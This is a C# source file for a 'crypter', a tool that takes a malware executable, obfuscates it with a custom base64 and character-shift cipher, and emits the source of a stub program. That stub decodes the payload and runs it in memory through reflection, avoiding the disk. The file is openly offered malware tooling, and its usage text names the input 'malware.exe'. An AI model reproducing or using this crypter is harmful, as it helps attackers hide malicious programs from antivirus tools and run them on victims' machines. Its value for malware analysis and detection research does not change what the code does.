using System;
using System.Dynamic;
using System.IO;

public class Crypter {

  static string FileToBase64(string filename) {
    Byte[] bytes = File.ReadAllBytes(filename);
    String base64 = Convert.ToBase64String(bytes);
    return base64;
  }

  static void Base64ToFile(string base64, string filename) {
    Byte[] bytes = Convert.FromBase64String(base64);
    File.WriteAllBytes(filename, bytes);
  }

static Tuple<string, string> Symmetric(string text, string key) {
    static int[] Base64ToNumber(string base64) {
      Char[] charset = {
        'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p',
	'q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G',
	'H','I','J','K','L','M','N','Ñ','O','P','Q','R','S','T','U','V','W',
	'X','Y','Z','1','2','3','4','5','6','7','8','9','0','+','/','='
      };

      int[] res = new int[base64.Length];
	      
      for(int i = 0, c = 0; i < base64.Length; i++) {
        for(int j = 0; j < charset.Length; j++) {
          if (base64[i] == charset[j]) { // char found in dictionary
            res[c++] = j;
	    // Console.WriteLine($@"Found {j}");
	  }
        }
      }
      return res;
    }

    static string NumberToText(int[] number) {
      Char[] charset = {
        'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p', // 16
        'q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G', // 33
        'H','I','J','K','L','M','N','Ñ','O','P','Q','R','S','T','U','V','W', // 50
        'X','Y','Z','1','2','3','4','5','6','7','8','9','0','+','/','=', // 66
	'@','#','$','%','&','*','-','(',')','!','"','\'',':',';','?','~', // 82
	'`','|','•','√','Π','÷','×','{','}','£','¢','€','°','^','_','[', // 98
        '™','®','©','¶','\\','<','>',',','.','á','đ','é','₣','î','ï','ì', // 114
	'í','λ','μ','ñ','ó','₱','û','ü','ÿ','ý','ž','Á','Ç','Đ','É','Î', // 130
	'Ï','Ì','Í','Ó','Û','Ü','Ù','Ú' //138
      };

      String res = "";
      for(int i = 0; i < number.Length; i++) {
        res += charset[number[i]];
      }
      return res;
    }

    static int[] AddNumericArrays(int[] numeric1, int[] numeric2) {
      // TODO: check arrays share length here
      int[] res = new int[numeric1.Length];


/*
      Console.WriteLine($@"Length of arrays to add.
numeric1   {numeric1.Length}
numeric2   {numeric2.Length}
res   {res.Length}

values:
numeric1   {string.Join(",", numeric1)}
numeric2   {string.Join(",", numeric2)}
");
*/

      for(int i = 0; i < numeric1.Length; i++) {
/*
	Console.WriteLine($@"Sumando:
{numeric1[i]} + {numeric2[i]} = {numeric1[i] + numeric2[i]}
");
*/
        res[i] = numeric1[i] + numeric2[i];
      }
/*
      Console.WriteLine($@"res {string.Join(",", res)}");
*/
      return res;
    }



    key = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(key));// Run at least once to force charset (reduces codebase length by reusing Base64ToNumber) 

    while (key.Length < text.Length) {

/*
      Console.WriteLine($@"Looping...
Key size is {key.Length}
Text size is {text.Length}
Key size increased...");
*/

      key = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(key));
    }

    // TODO: reduce key size to match exact text size. HERE
    
    int[] numericKey = Base64ToNumber(key);
    int[] numericText = Base64ToNumber(text);

/*
    Console.WriteLine($@"Original:
text   {text}
key    {key}

base64Encoded:
text   {string.Join(",", numericText)}
key    {string.Join(",", numericKey)}");
*/

    int[] numericAddition = AddNumericArrays(numericText, numericKey);
    string res = NumberToText(numericAddition);

/*
    Console.WriteLine($@"Result is:
{res}

");
*/

    /*for(int i d= 0; i < numericAddition.Length; i++) {
      Console.WriteLine($@"{i}° {numericAddition[i]}");
    }*/

    Tuple<string, string> cipherAndKey = new Tuple<string, string>(res, key);
    return cipherAndKey;
  }

  static void GenerateAutoRunnableFile(string outputFilename, string data, string key) {
    String b64Malware = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(data));
    // TODO: output to file and run using system/command to generate exe
    Console.WriteLine($@"using System;
using System.IO;
using System.Text; //Encoding
using System.Collections.Generic; //List
using System.Reflection;                                                                using System.Threading;                                                                                                                                                         public class Decrypter {{
  public static void RunFromMemory(byte[] bytes) {{
    Assembly a = Assembly.Load(bytes);
    MethodInfo method = a.EntryPoint;
    if (method == null) return;
    object[] parameters = method.GetParameters().Length == 0 ? null : new object[] {{ new string[0] }};
    method.Invoke(null, parameters);
  }}

  static string Decrypt(string base64, string key) {{
    static string NumberToBase64(int[] base64) {{
      Char[] charset = {{
        'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p',
        'q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G',
        'H','I','J','K','L','M','N','Ñ','O','P','Q','R','S','T','U','V','W',
        'X','Y','Z','1','2','3','4','5','6','7','8','9','0','+','/','='
      }};

      String res = """";
      for(int i = 0; i < base64.Length; i++) {{
         res += charset[base64[i]];
      }}
      return res;
    }}


    static int[] SubstractNumericArrays(int[] numeric1, int[] numeric2) {{
      // TODO: check arrays share length here
      int[] res = new int[numeric1.Length];

      for(int i = 0; i < numeric1.Length; i++) {{
        res[i] = numeric1[i] - numeric2[i];
      }}

      return res;
    }}

    static int[] TextToNumber(string text) {{
      Char[] charset = {{
        'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p', // 16
        'q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G', // 33
        'H','I','J','K','L','M','N','Ñ','O','P','Q','R','S','T','U','V','W', // 50
        'X','Y','Z','1','2','3','4','5','6','7','8','9','0','+','/','=', // 66
	'@','#','$','%','&','*','-','(',')','!','""','\'',':',';','?','~', // 82
        '`','|','•','√','Π','÷','×','{{','}}','£','¢','€','°','^','_','[', // 98
        '™','®','©','¶','\\','<','>',',','.','á','đ','é','₣','î','ï','ì', // 114
        'í','λ','μ','ñ','ó','₱','û','ü','ÿ','ý','ž','Á','Ç','Đ','É','Î', // 130
        'Ï','Ì','Í','Ó','Û','Ü','Ù','Ú' //138
      }};

      // int[] res = new int[text.Length];
      var list = new List<int>();


      for(int i = 0/*, k = 0*/; i < text.Length; i++) {{
        for(int j = 0; j < charset.Length; j++) {{
          if (text[i] == charset[j]) {{
            // res[k++] = j;
	    list.Add(j);
	  }}
        }}
      }}
      return list.ToArray();
    }}





    // decode b64
    byte[] data = Convert.FromBase64String(base64);
    string decoded = Encoding.UTF8.GetString(data);
/*
    Console.WriteLine($@""Decoded:
{{decoded}}
"");
*/
    // get numeric array from base64decoded
    int[] numericText = TextToNumber(decoded);
/*
    Console.WriteLine($@""NumericText:
{{string.Join("","", numericText)}}
"");
*/
    // get numeric array from key
    int[] numericKey = TextToNumber(key);
/*
    Console.WriteLine($@""NumericKey:
{{string.Join("","", numericKey)}}
"");
*/

    // substract arrays
    int[] originalNumeric = SubstractNumericArrays(numericText, numericKey);
/*
    Console.WriteLine($@""originalNumeric:
{{string.Join("","", originalNumeric)}}
"");
*/

    // substractedResult to text
    String originalBase64 = NumberToBase64(originalNumeric);
    /* Console.WriteLine($@""originalBase64:
{{originalBase64}}
""); */


    // decode text from base64
    byte[] rawData = Convert.FromBase64String(originalBase64);
    // debug 
    /* string debug = Encoding.UTF8.GetString(rawData);
    Console.WriteLine($@""rawDataAsText
{{debug}}
""); */

    // write decoded as bytes to file (not in memory)
    // File.WriteAllBytes(""./dummy_malware"", rawData);

    // run bytes 
    RunFromMemory(rawData);


    return """";
  }}



  static int Main(string[] args) {{
    Decrypt(""{b64Malware}"", ""{key}"");
    return 0;
  }}
}}

");
}

  static int Main(string[] args) {
	
    dynamic cli = new ExpandoObject(); 
    cli.file = null;
    cli.key = null;
    cli.output = null;
    cli.silence = null;

    for (int i = 0; i < args.Length; i++) { // parse cli arguments
      switch(args[i]) {
	case "-f":
	case "--file":
	  if (i + 1 < args.Length) { // make sure there is another arg after --file
            cli.file = args[i + 1];
	  } else {
            cli.file = null;
	  }
	break;

	case "-k":
	case "--key":
	  if (i + 1 < args.Length) {
	    cli.key = args[i + 1];
	  } else {
	    cli.key = null;
	  }
	break;

        case "-o":
	case "--output":
          if (i + 1 < args.Length) {
            cli.output = args[i + 1];
	  } else {
            cli.output = null;
	  }
	break;

	case "-s":
	case "--silence":
	  cli.silence = true;
	break;

        case "-h":
	case "--help":
	  Console.WriteLine(@"Usage: mono crypter.exe --file malware.exe
-f --file     File to crypt
-k --key      Key to use
-o --output   Runnable encrypted malware
-s --silence  Do not output warning messages to stdout
-h --help     Show this help message

Example:
mono crypter.exe --file malware.exe
");
	  return 0; // exit
	break;

      }
    }

    // if (!cli.file) {
    if (cli.file == null) {
      Console.WriteLine("Missing --file argument");
      return 0; // exit
    }

    if (cli.key == null) {
      if (cli.silence == null) {
        Console.WriteLine("Missing --key argument, using default value");
      }
      cli.key = "a";
    }

    if (cli.output == null) {
      cli.output = cli.file + ".exe";
      if (cli.silence == null) {
        Console.WriteLine("Missing --output argument, using {0} as output filename", cli.output);
      }
    }

    String base64String = FileToBase64(cli.file);

    Tuple<string, string> cipherAndKey = Symmetric(base64String, cli.key);
    String ciphered = cipherAndKey.Item1;
    String key = cipherAndKey.Item2;
    //String ciphered = Symmetric(base64String, cli.key);
    // Console.WriteLine("Ciphered: {0}", ciphered);

    GenerateAutoRunnableFile(cli.output, ciphered, key);


    return 0; // exit
  }
}
